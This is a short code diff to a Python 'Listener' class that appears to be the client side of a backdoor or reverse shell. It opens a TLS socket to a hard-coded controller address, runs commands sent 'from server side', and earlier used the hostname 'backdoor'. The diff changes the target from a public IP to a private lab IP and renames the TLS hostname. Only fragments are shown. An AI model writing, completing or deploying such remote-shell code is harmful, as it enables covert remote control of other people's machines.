@@ -8,7 +8,7 @@ class Listener:
         self.context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
         self.context.load_verify_locations("ca.crt")
         self.connection=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-        self.connection= self.context.wrap_socket(self.connection, server_hostname='backdoor')
+        self.connection= self.context.wrap_socket(self.connection, server_hostname='smitk')
         self.ip=ip
         self.port=port
         self.connection.connect((ip,port))
@@ -108,6 +108,6 @@ class Listener:
                 print("[-] Error during command execution from server side\n\n" + str(e))
         
 
-my_listener=Listener("98.70.78.176",8080)
+my_listener=Listener("192.168.56.1",8080)
 # my_listener=Listener("localhost",4444)
 my_listener.run()
